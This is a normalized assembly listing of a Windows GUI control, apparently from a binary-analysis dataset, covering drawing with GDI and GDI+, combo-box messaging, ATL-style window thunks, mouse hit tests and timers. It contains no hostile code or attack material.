mov [ ebp - 0x14 ] ebx
call [ GetClientRect@IAT ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
cmp edx [ esi + 0xa8 ]
jle r-xdata
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp + 0x8 ]
push ecx
call [ CreateCompatibleDC@IAT ]
lea edx [ ebp - 0x3c ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x8 ]
push edx
push eax
mov [ ebp - 0x3c ] ebx
call [ GdipCreateFromHDC@IAT ]
mov ecx [ ebp - 0x3c ]
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x4 ] 0x3
mov eax [ ebp - 0x38 ]
mov ecx [ ebp + 0x8 ]
mov edi ecx
cmp eax ebx
je r-xdata
cmp [ esi + 0x9c ] 0xffffffff
jne r-xdata
push 0x14
mov [ ebp - 0x38 ] edi
call [ operator new@IAT ]
add esp 0x4
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x4 ] 0x4
cmp eax ebx
je r-xdata
cmp eax ecx
je r-xdata
mov eax [ ebp - 0x40 ]
push 0x1
push 0xffffffff
push eax
call [ OffsetRect@IAT ]
xor edi edi
mov ecx [ esi + 0x78 ]
lea edx [ ebp - 0x38 ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edx
lea ecx [ ebp - 0x48 ]
lea edx [ ebp - 0x34 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] edx
mov edi eax
jmp r-xdata
push eax
call [ DeleteDC@IAT ]
mov eax [ ebp - 0x34 ]
mov esi [ DeleteDC@IAT ]
mov [ ebp - 0x38 ] ebx
cmp eax ebx
je r-xdata
mov edx [ edi ]
mov eax [ edx ]
push 0x1
mov ecx edi
call eax
mov [ ebp - 0x4 ] 0x3
mov esi [ esi + 0xa0 ]
mov edx [ ebp - 0x40 ]
mov eax [ esi ]
mov eax [ eax + 0x14 ]
push ebx
lea ecx [ ebp - 0x30 ]
push ecx
push edx
push edi
mov ecx esi
call eax
cmp edi ebx
je r-xdata
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp - 0x38 ]
cmp eax ebx
je r-xdata
push eax
call esi
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x48 ]
push ecx
call [ GdipDeleteGraphics@IAT ]
mov [ ebp - 0x4 ] bl
mov eax [ ebp - 0x34 ]
cmp eax ebx
je r-xdata
push eax
mov [ ebp - 0x38 ] ebx
call esi
mov [ ebp - 0x34 ] ebx
push eax
mov [ ebp - 0x34 ] ebx
call esi
sub_430160
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x24 ] 0x0
je r-xdata
xor al al
pop esi
pop ebp
retn 0x4
mov al [ ebp + 0x8 ]
mov [ esi + 0x26 ] al
test al al
jne r-xdata
mov ecx [ esi + 0x18 ]
mov eax [ ecx ]
mov edx [ eax + 0x64 ]
call edx
test eax eax
je r-xdata
mov ecx [ esi + 0x1c ]
mov eax [ ecx ]
mov edx [ eax + 0x44 ]
push esi
call edx
mov ecx [ esi + 0x1c ]
mov eax [ ecx ]
mov edx [ eax + 0x24 ]
push esi
call edx
mov ecx [ esi + 0x18 ]
mov eax [ ecx ]
mov edx [ eax + 0x28 ]
push 0xe
push 0x1
call edx
jmp r-xdata
mov al 0x1
pop esi
pop ebp
retn 0x4
mov eax [ esi + 0x78 ]
push 0x0
push eax
call [ ShowWindow@IAT ]
test eax eax
je r-xdata
sub_4301d0
push esi
mov esi ecx
cmp [ esi + 0x1c ] 0x0
je r-xdata
pop esi
retn
mov eax [ esi + 0x78 ]
push 0x0
push 0x0
push 0x147
push eax
call [ SendMessageW@IAT ]
mov ecx [ esi + 0x1c ]
mov edx [ ecx ]
mov edx [ edx + 0x10 ]
push eax
mov eax [ esi + 0x8 ]
push eax
push 0x500
push esi
call edx
sub_430210
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
push esi
push 0x0
push ebx
push 0x149
push ecx
call [ SendMessageW@IAT ]
mov esi eax
or eax 0xffffffff
cmp esi eax
je r-xdata
pop esi
mov esp ebp
pop ebp
retn 0x4
mov [ ebp - 0x4 ] eax
test esi esi
jns r-xdata
mov eax [ edi ]
mov edx 0x1
sub edx [ eax - 0x4 ]
mov eax [ eax - 0x8 ]
sub eax esi
or edx eax
jge r-xdata
push 0x80070057
call sub_402d00
mov eax [ edi ]
cmp esi [ eax - 0x8 ]
jg r-xdata
mov eax esi
mov ecx edi
call sub_402c40
mov [ eax - 0xc ] esi
mov ecx [ edi ]
xor edx edx
mov [ ecx + esi * 2 ] dx
test eax eax
je r-xdata
mov esi [ ebp - 0x4 ]
mov eax esi
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
push ebx
push 0x148
push ecx
call [ SendMessageW@IAT ]
mov esi eax
mov eax [ edi ]
mov ecx [ eax - 0x8 ]
test eax eax
je r-xdata
mov ecx [ edi ]
cmp eax [ ecx - 0x8 ]
jg r-xdata
push ecx
push eax
call [ wcsnlen@IAT ]
add esp 0x8
test eax eax
js r-xdata
mov [ ecx - 0xc ] eax
mov edx [ edi ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_4302d0
push ebp
mov ebp esp
push 0xffffffff
push sub_4469d8
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
or edx 0xffffffff
mov [ ebp - 0x4 ] edx
lea eax [ ecx + 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
push eax
call sub_443ef4
sub_430330
push ebp
mov ebp esp
push edi
mov edi eax
cmp edi 0x39
ja r-xdata
cmp edi 0x115
ja r-xdata
je r-xdata
cmp edi 0x132
jb r-xdata
cmp edi 0x114
jae r-xdata
test ebx ebx
je r-xdata
lea eax [ edi - 0x2b ]
cmp eax 0x4
ja r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx ] 0x0
mov eax 0x1
pop edi
pop ebp
retn 0x4
cmp edi 0x138
jbe r-xdata
mov eax esi
cmp edi 0x4e
je r-xdata
mov eax [ esi + 0x8 ]
jmp r-xdata
jmp [ eax * 4 + jump_table_430404 ]
cmp edi 0x210
jne r-xdata
push esi
push ebx
add edi 0x2000
push edi
push eax
call [ SendMessageW@IAT ]
pop edi
pop ebp
retn 0x4
mov eax [ esi ]
jmp r-xdata
cmp edi 0x111
jne r-xdata
test eax eax
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
movzx eax bx
dec eax
cmp eax 0x1
jbe r-xdata
test esi esi
je r-xdata
mov eax [ esi + 0x14 ]
jmp r-xdata
mov eax [ esi + 0x4 ]
push eax
mov eax [ ecx + 0x4 ]
push eax
call [ GetDlgItem@IAT ]
jmp r-xdata
mov eax [ esi + 0xc ]
jmp r-xdata
mov eax [ ecx + 0x4 ]
mov edx ebx
shr edx 0x10
push edx
push eax
call [ GetDlgItem@IAT ]
jmp r-xdata
sub_430420
push ebp
mov ebp esp
cmp eax 0x2111
ja r-xdata
lea ecx [ eax - 0x2114 ]
cmp ecx 0xfc
ja r-xdata
je r-xdata
xor eax eax
pop ebp
retn
movzx edx [ ecx + lookup_table_4304c0 ]
jmp [ edx * 4 + jump_table_4304b8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
push ecx
push edx
add eax 0xffffe000
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ DefWindowProcW@IAT ]
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
mov eax 0x1
pop ebp
retn
lea ecx [ eax - 0x202b ]
cmp ecx 0x23
ja r-xdata
movzx ecx [ ecx + lookup_table_430494 ]
jmp [ ecx * 4 + jump_table_43048c ]
sub_4304c2
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add ah cl
int3
sub_4305c0
push ebp
mov ebp esp
push esi
call sub_406d30
mov esi eax
test esi esi
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x8 ]
push ebx
mov ebx [ ebp + 0x8 ]
push edi
mov ecx esi
mov [ esi + 0x4 ] ebx
call edx
cmp [ esi + 0x14 ] 0x0
mov edi eax
jne r-xdata
pop esi
pop ebp
retn 0x10
mov eax [ esi + 0x14 ]
sub edi eax
push 0xd
sub edi 0xd
push eax
mov [ eax ] 0x42444c7
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] 0xe9
mov [ eax + 0x9 ] edi
call [ GetCurrentProcess@IAT ]
push eax
call [ FlushInstructionCache@IAT ]
call j_sub_443f06
mov [ esi + 0x14 ] eax
test eax eax
je r-xdata
mov esi [ esi + 0x14 ]
push esi
push 0xfffffffc
push ebx
call [ SetWindowLongW@IAT ]
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
push eax
push ecx
push edx
push ebx
call esi
pop edi
pop ebx
pop esi
pop ebp
retn 0x10
sub_430650
push ebp
mov ebp esp
push esi
push edi
mov edi eax
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x14 ]
mov ecx 0xfffffff3
push 0xd
sub ecx eax
push eax
mov [ eax ] 0x42444c7
mov [ eax + 0x4 ] 0x0
mov [ eax + 0x8 ] 0xe9
mov [ eax + 0x9 ] ecx
call [ GetCurrentProcess@IAT ]
push eax
call [ FlushInstructionCache@IAT ]
test bx bx
je r-xdata
call j_sub_443f06
mov [ edi + 0x14 ] eax
test eax eax
je r-xdata
pop edi
xor eax eax
pop esi
pop ebp
retn 0x18
push edi
lea esi [ edi + 0x8 ]
call sub_406f10
mov esi [ ebp + 0x1c ]
test esi esi
jne r-xdata
push 0xe
call [ SetLastError@IAT ]
mov eax [ ebp + 0xc ]
test eax eax
jne r-xdata
test [ ebp + 0x14 ] 0x40000000
je r-xdata
mov edi [ rw-data ]
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
push 0x0
push edi
push esi
mov esi [ ebp + 0x8 ]
push esi
mov esi [ eax + 0xc ]
mov eax [ eax + 0x8 ]
sub esi ecx
push esi
sub eax edx
push eax
push ecx
mov ecx [ ebp + 0x14 ]
push edx
mov edx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0x18 ]
movzx eax bx
push edx
push eax
push ecx
call [ CreateWindowExW@IAT ]
pop edi
pop esi
pop ebp
retn 0x18
mov eax rw-data
mov [ ebp + 0xc ] eax
mov esi edi
mov [ ebp + 0x1c ] esi
sub_430740
push ebp
mov ebp esp
push 0xffffffff
push sub_448570
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push esi
call sub_43e780
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0x74 ] r--data
mov ecx 0x1
mov [ ebp - 0x4 ] ecx
fldz
fst [ esi + 0xe0 ]
mov [ esi ] r--data
fst [ esi + 0xe8 ]
mov [ esi + 0x70 ] r--data
fst [ esi + 0xf0 ]
mov [ esi + 0x74 ] r--data
fstp [ esi + 0xf8 ]
mov [ esi + 0xc ] 0x19
mov [ esi + 0xb4 ] eax
mov [ esi + 0xb8 ] eax
mov [ esi + 0xc0 ] 0x8
mov [ esi + 0xbc ] eax
mov [ esi + 0xc8 ] ecx
mov [ esi + 0xc4 ] eax
mov [ esi + 0xcc ] eax
mov [ esi + 0xd0 ] eax
mov [ esi + 0xd4 ] eax
mov [ esi + 0xd8 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_430820
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_430850
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_430850
push ebp
mov ebp esp
push 0xffffffff
push sub_448538
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0x74 ] r--data
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov eax [ esi + 0xa4 ]
mov edi [ DeleteObject@IAT ]
cmp eax ebx
je r-xdata
mov eax [ esi + 0xa0 ]
cmp eax ebx
je r-xdata
push eax
call edi
mov [ esi + 0xa4 ] ebx
mov eax [ esi + 0x9c ]
cmp eax ebx
je r-xdata
push eax
call edi
mov [ esi + 0xa0 ] ebx
mov [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_42e750
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
call edi
mov [ esi + 0x9c ] ebx
sub_430900
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax [ ebp + 0x10 ]
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
mov ecx [ ebp + 0xc ]
push eax
push ecx
push edi
mov ecx esi
call sub_43ea10
push 0x1
push edi
mov ecx esi
call sub_430f80
push 0x0
push edi
mov ecx esi
call sub_430f80
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
sub_430940
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
mov edi ecx
mov esi [ edi + 0x4 ]
lea ecx [ esi + 0xb0 ]
lea ebx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x4 ] 0x0
call sub_414260
mov eax [ ebp - 0x8 ]
cmp eax [ esi + 0xb4 ]
je r-xdata
xor esi esi
mov esi [ eax + 0x10 ]
jmp r-xdata
xor esi esi
mov esi [ eax + 0x10 ]
jmp r-xdata
mov ecx [ esi + 0x14 ]
mov eax [ esi ]
mov edx [ eax + 0xc ]
push ecx
mov ecx esi
call edx
mov eax [ esi + 0xc ]
mov esi [ edi + 0x4 ]
cdq
and edx 0x7
add eax edx
sar eax 0x3
mov [ edi + 0xb4 ] eax
lea ecx [ esi + 0xb0 ]
lea ebx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] 0x0
call sub_414260
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0xb4 ]
je r-xdata
mov ecx [ esi + 0x14 ]
mov eax [ esi ]
mov edx [ eax + 0xc ]
push ecx
mov ecx esi
call edx
mov eax [ esi + 0x10 ]
mov ecx [ edi + 0xb0 ]
mov [ edi + 0xb8 ] eax
mov [ ecx + 0xdc ] 0x1
mov ecx edi
call sub_43eb40
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_430a00
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
mov edi ecx
call sub_43ee50
add [ esi ] 0x2
mov eax [ edi + 0xb4 ]
sub [ esi + 0x8 ] eax
pop edi
pop esi
pop ebp
retn 0x4
sub_430a30
push esi
push edi
mov esi ecx
mov ecx [ esi - 0x54 ]
lea edi [ esi - 0x70 ]
push edi
push 0x138
call sub_412fd0
mov ecx [ esi - 0x54 ]
push edi
push 0x133
call sub_412fd0
mov ecx [ esi - 0x54 ]
push edi
push 0x111
call sub_412fd0
mov ecx [ esi - 0x54 ]
push edi
push 0x2a3
call sub_412fd0
mov ecx [ esi - 0x54 ]
push edi
push 0x200
call sub_412fd0
mov ecx [ esi - 0x54 ]
push edi
push 0x201
call sub_412fd0
mov ecx [ esi - 0x54 ]
push edi
push 0x202
call sub_412fd0
mov ecx [ esi - 0x54 ]
push edi
push 0x203
call sub_412fd0
pop edi
pop esi
retn
sub_430ab0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x24
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x20 ] eax
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
push edi
mov edi ecx
mov ecx [ ebp + 0x18 ]
push ecx
mov [ esp + 0x1c ] ecx
mov ecx [ ebp + 0x10 ]
push ebx
push ecx
push edx
push eax
mov ecx edi
call sub_43f650
mov eax [ edi - 0x70 ]
mov edx [ eax + 0x78 ]
lea esi [ edi - 0x70 ]
mov ecx esi
call edx
test al al
je r-xdata
mov ecx [ esp + 0x2c ]
pop edi
pop esi
pop ebx
xor ecx esp
xor eax eax
call sub_443fba
mov esp ebp
pop ebp
retn 0x14
mov eax ebx
shr eax 0x10
movsx edx ax
mov eax [ esi + 0x30 ]
mov [ esp + 0x1c ] eax
mov eax [ esi + 0x38 ]
dec eax
mov [ esp + 0x24 ] eax
sub eax [ esi + 0xb4 ]
mov [ esp + 0x14 ] edx
mov edx [ esi + 0x34 ]
mov [ esp + 0x1c ] eax
mov eax [ esp + 0x14 ]
movsx ecx bx
mov [ esp + 0x20 ] edx
mov edx [ esi + 0x3c ]
inc [ esp + 0x20 ]
push eax
push ecx
lea ecx [ esp + 0x24 ]
dec edx
push ecx
mov [ esp + 0x34 ] edx
call [ PtInRect@IAT ]
mov [ esp + 0x10 ] eax
test eax eax
jne r-xdata
mov ecx [ ebp + 0xc ]
add ecx 0xfffffe00
cmp ecx 0x3
ja r-xdata
cmp [ edi + 0x54 ] eax
je r-xdata
jmp [ ecx * 4 + jump_table_430bd8 ]
mov [ edi + 0x54 ] eax
mov eax esi
call sub_430cc0
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov eax [ edi + 0x8 ]
push 0x3e9
push eax
call [ KillTimer@IAT ]
cmp [ esp + 0x10 ] 0x0
je r-xdata
test [ ebp + 0x10 ] 0x1
mov [ edi + 0x54 ] 0x1
jne r-xdata
mov edx [ esp + 0x18 ]
push edx
mov ecx ebx
call sub_430d10
jmp r-xdata
mov ecx ebx
call sub_430ea0
mov ecx ebx
call sub_430bf0
jmp r-xdata
sub_430bf0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x14
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x10 ] eax
cmp [ esi + 0x27 ] 0x0
push edi
jne r-xdata
mov eax [ esi + 0x30 ]
mov edx [ esi + 0x34 ]
mov edi [ esi + 0x3c ]
mov [ esp + 0x4 ] eax
mov eax [ esi + 0x38 ]
dec eax
mov [ esp + 0xc ] eax
sub eax [ esi + 0xb4 ]
inc edx
mov [ esp + 0x4 ] eax
mov eax [ esi + 0xb8 ]
add eax edx
mov [ esp + 0x10 ] edi
mov [ esp + 0x10 ] eax
movsx eax cx
shr ecx 0x10
movsx ecx cx
push ecx
push eax
lea ecx [ esp + 0xc ]
push ecx
mov [ esp + 0x14 ] edx
call [ PtInRect@IAT ]
neg eax
sbb eax eax
and eax 0xfffffffc
add eax 0x5
mov [ esi + 0xc0 ] eax
mov [ esi + 0xc0 ] 0x9
jmp r-xdata
mov ecx [ esp + 0x14 ]
pop edi
xor ecx esp
xor eax eax
call sub_443fba
mov esp ebp
pop ebp
retn
cmp [ esi + 0x25 ] 0x0
je r-xdata
cmp [ esi + 0x24 ] 0x0
je r-xdata
cmp [ esi + 0x26 ] 0x0
je r-xdata
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ eax + 0xab ] 0x0
mov edx [ ecx ]
mov edx [ edx + 0x20 ]
sete al
movzx eax al
push 0x0
push eax
push esi
call edx
sub_430cc0
xor ecx ecx
cmp [ eax + 0x27 ] cl
sete cl
add ecx 0x8
cmp [ eax + 0x24 ] 0x0
mov [ eax + 0xc0 ] ecx
je r-xdata
xor eax eax
retn
cmp [ eax + 0x25 ] 0x0
je r-xdata
cmp [ eax + 0x26 ] 0x0
je r-xdata
mov ecx [ eax + 0x1c ]
test ecx ecx
je r-xdata
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
cmp [ edx + 0xab ] 0x0
push esi
mov esi [ ecx ]
sete dl
movzx edx dl
push 0x0
push edx
push eax
mov eax [ esi + 0x20 ]
call eax
pop esi
sub_430d10
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x14
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x10 ] eax
mov eax [ ebp + 0x8 ]
push edi
mov [ eax ] 0x1
mov eax [ esi + 0x78 ]
push eax
mov edi ecx
call [ GetParent@IAT ]
push eax
call [ SetFocus@IAT ]
cmp [ esi + 0x27 ] 0x0
jne r-xdata
mov eax [ esi + 0x30 ]
mov ecx [ esi + 0x34 ]
mov edx [ esi + 0x3c ]
mov [ esp + 0x4 ] eax
mov eax [ esi + 0x38 ]
dec eax
mov [ esp + 0xc ] eax
sub eax [ esi + 0xb4 ]
inc ecx
mov [ esp + 0x4 ] eax
mov eax [ esi + 0xb8 ]
add eax ecx
mov [ esp + 0x10 ] edx
mov [ esp + 0x10 ] eax
movsx eax di
mov [ esp + 0x8 ] ecx
shr edi 0x10
movsx ecx di
push ecx
push eax
lea ecx [ esp + 0xc ]
push ecx
call [ PtInRect@IAT ]
test eax eax
je r-xdata
cmp [ esi + 0x24 ] 0x0
mov [ esi + 0xc0 ] 0x9
je r-xdata
mov [ esi + 0xc0 ] 0x6
mov [ esi + 0xbc ] 0x0
mov [ esi + 0xc0 ] 0x2
mov [ esi + 0xbc ] 0x1
jmp r-xdata
mov ecx [ esp + 0x14 ]
pop edi
xor ecx esp
xor eax eax
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
cmp [ esi + 0x25 ] 0x0
je r-xdata
mov eax [ esi + 0xbc ]
push eax
mov eax esi
call sub_431180
mov ecx [ esi + 0x78 ]
push 0x0
push 0xc8
push 0x3e9
push ecx
call [ SetTimer@IAT ]
cmp [ esi + 0x25 ] 0x0
je r-xdata
cmp [ esi + 0x24 ] 0x0
je r-xdata
cmp [ esi + 0x26 ] 0x0
je r-xdata
cmp [ esi + 0x26 ] 0x0
je r-xdata
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ eax + 0xab ] 0x0
mov edx [ ecx ]
mov edx [ edx + 0x20 ]
sete al
movzx eax al
push 0x0
push eax
push esi
call edx
xor eax eax
pop edi
mov ecx [ esp + 0x10 ]
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
cmp [ eax + 0xab ] 0x0
mov edx [ ecx ]
mov edx [ edx + 0x20 ]
sete al
movzx eax al
push 0x0
push eax
push esi
call edx
sub_430ea0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x14
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x10 ] eax
mov eax [ esi + 0x78 ]
push edi
push 0x3e9
push eax
mov edi ecx
call [ KillTimer@IAT ]
cmp [ esi + 0x27 ] 0x0
jne r-xdata
mov eax [ esi + 0x38 ]
mov ecx [ esi + 0x30 ]
mov edx [ esi + 0x3c ]
dec eax
mov [ esp + 0xc ] eax
sub eax [ esi + 0xb4 ]
mov [ esp + 0x4 ] ecx
mov ecx [ esi + 0x34 ]
mov [ esp + 0x4 ] eax
mov eax [ esi + 0xb8 ]
inc ecx
add eax ecx
mov [ esp + 0x10 ] edx
mov [ esp + 0x10 ] eax
movsx eax di
mov [ esp + 0x8 ] ecx
shr edi 0x10
movsx ecx di
push ecx
push eax
lea ecx [ esp + 0xc ]
push ecx
call [ PtInRect@IAT ]
neg eax
sbb eax eax
and eax 0xfffffffc
add eax 0x5
mov [ esi + 0xc0 ] eax
mov [ esi + 0xc0 ] 0x9
jmp r-xdata
mov ecx [ esp + 0x14 ]
pop edi
xor ecx esp
xor eax eax
call sub_443fba
mov esp ebp
pop ebp
retn
cmp [ esi + 0x25 ] 0x0
je r-xdata
cmp [ esi + 0x24 ] 0x0
je r-xdata
cmp [ esi + 0x26 ] 0x0
je r-xdata
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ eax + 0xab ] 0x0
mov edx [ ecx ]
mov edx [ edx + 0x20 ]
sete al
movzx eax al
push 0x0
push eax
push esi
call edx
sub_430f80
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi ecx
mov ecx [ esi + 0x30 ]
mov edx [ esi + 0x34 ]
mov [ ebp - 0x28 ] eax
mov eax [ esi + 0x38 ]
mov [ ebp - 0x14 ] ecx
mov ecx [ esi + 0x3c ]
dec eax
mov [ ebp - 0xc ] eax
sub eax [ esi + 0xb4 ]
dec ecx
push edi
mov edi [ esi + 0x4 ]
mov [ ebp - 0x14 ] eax
inc edx
mov [ ebp - 0x8 ] ecx
lea ecx [ edi + 0xb0 ]
lea ebx [ ebp - 0x30 ]
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x30 ] 0x0
call sub_414260
mov eax [ ebp - 0x2c ]
cmp eax [ edi + 0xb4 ]
je r-xdata
xor ebx ebx
mov ebx [ eax + 0x10 ]
jmp r-xdata
mov eax [ esi + 0xb8 ]
add [ ebp - 0x10 ] eax
mov edi [ esi + 0xc0 ]
lea eax [ edi - 0x4 ]
cmp eax 0x5
ja r-xdata
mov edx [ esi + 0xb8 ]
add edx [ ebp - 0x10 ]
mov edi [ esi + 0xc0 ]
mov [ ebp - 0x8 ] edx
cmp edi 0x9
ja r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov edi 0x4
jmp [ eax * 4 + jump_table_4310c0 ]
xor edi edi
jmp r-xdata
movzx ecx [ edi + lookup_table_4310b4 ]
jmp [ ecx * 4 + jump_table_4310a4 ]
mov edi 0x7
jmp r-xdata
mov edx [ ebx ]
mov eax [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
push eax
mov ecx ebx
call edx
mov eax [ ebx + 0x10 ]
mov esi [ esi + 0xb4 ]
mov [ ebp - 0x18 ] eax
mov eax esi
imul eax edi
push 0x0
lea ecx [ ebp - 0x24 ]
push ecx
mov ecx [ ebp - 0x28 ]
add esi eax
lea edx [ ebp - 0x14 ]
push edx
mov [ ebp - 0x20 ] 0x0
